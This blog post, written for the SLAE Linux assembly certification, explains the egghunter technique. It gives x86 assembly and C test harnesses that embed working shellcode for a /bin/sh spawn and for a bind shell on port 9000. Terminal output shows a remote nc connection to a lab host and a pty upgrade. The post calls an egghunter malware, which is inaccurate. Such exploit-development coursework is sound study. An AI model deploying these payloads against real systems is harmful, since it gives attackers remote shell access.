---
layout: post
title: Egghunter
date: 2021-01-16 16:31:00
categories: posts
comments: false
en: true
---

#### Introduction

These series of posts starting with the prefix "Assignment" will be created in order to fulfill the requirements of the SLAE certification. Today we are going to have a close 
look at Egghunters. 

An Egghunter is a form of malware, commonly used during Exploit-Development sessions in order to process bigger shellcode when there is low space available. The process is quite 
simple, this will search for a specific tag within the memory. When found, the flow will be passed upon the instructions following the tag, executing the original shellcode. 

The third assignment from the seven requires the creation of an Egghunter through the Assembly language, and converting such into [shellcode](https://es.wikipedia.org/wiki/Shellcode). Moreover, it is required to test such.

##### Methods

In order to create an Egghunter shellcode, there are several paths. However, as the time goes on, newer techniques are implemented that make shellcoding easier. I have chosen to 
cover a modern method which is fast, and tends to be very small regarding size. This method obeys the following procedure:

+ The tag is saved on ESI
+ EBX is incremented
+ The value of EBX is compared with ESI. If positive, this should set the Zero Flag (ZF)
+ Repeat this process through a jump if not zero (JNZ) condition.
+ Jump into EBX.

It is quite important to note that the tag does not contain an opocode that could interfere with our egghunter, such as an INC ESI (46), or DEC EBX (4B). The chosen tag is 
45474547 (GEGE).

Code:

```term
global _start

_start:

      mov esi, 0x45474547       ; Moves the tag GEGE into ESI

main:

      inc ebx                   ; Increments EBX for comparison.
      cmp dword [ebx], esi      ; Compares EBX with ESI, that contains the tag. If they contain the same value, set the Zero flag (ZF).
      jne main                  ; Jumps to main to repeat the loop until the Zero flag (ZF) is set.
      push ebx                  ; Pushes the value of EBX into the stack.
      ret                       ; Pops it into the EIP.
```

Let's test this egghunter within the C format:

```term
#include<stdio.h>
#include<string.h>

unsigned char egg[] = \
"\xbe\x47\x45\x47\x45\x43\x39\x33\x75\xfb\x53\xc3";

unsigned char code[] = \
"\x47\x45\x47\x45"
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\xb0\x0b\xcd\x80";

main()
{

  printf("Shellcode size:  %d\n", strlen(code));
  printf("Egg size:  %d\n", strlen(egg));

        int (*ret)() = (int(*)())egg;

        ret();

}
```

#### EndGame

```term
whitecr0wz@SLAE:~/assembly/assignments/Assignment_3$ gcc egghunter.c -o egghunter -fno-stack-protector -z execstack -w 
whitecr0wz@SLAE:~/assembly/assignments/Assignment_3$ ./egghunter 
Shellcode size:  26
Egg size:  12
$
```

Furthermore, there is an additional detail that the egghunter should be configurable for different payloads. As the only requirement is to leave the tag at the start of the 
payload, configuration for different shellcodes should be easy.

Let's test this egghunter within the C format once again. I will now use the bind shell developed during [this](https://whitecr0wz.github.io/posts/SLAE-Bind/) post.

```term
#include<stdio.h>
#include<string.h>

unsigned char egg[] = \
"\xbe\x47\x45\x47\x45\x43\x39\x33\x75\xfb\x53\xc3";

unsigned char code[] = \
"\x47\x45\x47\x45"
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\x68\x67\x01\x66\x58\xb3\x02\xb1\x01\x52\xcd\x80\x89\xc6\x66\x68\x69\x01\x66\x58\x89\xf3\x52\x52\x66\x68\x23\x28\x66\x6a\x02\x89\xe1
\xb2\x10\xcd\x80\x66\x68\x6b\x01\x66\x58\x89\xf3\x31\xc9\x51\xcd\x80\x66\x68\x6c\x01\x66\x58\x89\xf3\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\xb1\x03\x66\x6a\x3f\x66\x58\x89\xf3\
xfe\xc9\xcd\x80\x75\xf3\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\x66\x6a\x0b\x66\x58\xcd\x80";

main()
{

  printf("Shellcode size:  %d\n", strlen(code));
  printf("Egg size:  %d\n", strlen(egg));

        int (*ret)() = (int(*)())egg;

        ret();

}
```

#### EndGame #2

```term
whitecr0wz@SLAE:~/assembly/assignments/Assignment_3$ gcc egghunter.c -o egghunter -fno-stack-protector -z execstack -w 
whitecr0wz@SLAE:~/assembly/assignments/Assignment_3$ ./egghunter 
Shellcode size:  131
Egg size:  12

─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@whitecr0wz:~# rlwrap nc 192.168.100.200 9000 -v 
192.168.100.200: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.100.200] 9000 (?) open
python3 -c 'import pty;pty.spawn("/bin/bash")'
whitecr0wz@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_3$ id && whoami 
<wz/assembly/assignments/Assignment_3$ id && whoami                 
uid=1001(whitecr0wz) gid=1001(whitecr0wz) groups=1001(whitecr0wz)
whitecr0wz
whitecr0wz@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_3$
```

### Code

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-27812/PA-27812

You can find all of the used resources within this post [here](https://github.com/whitecr0wz/SLAE/tree/main/Assignment_3).
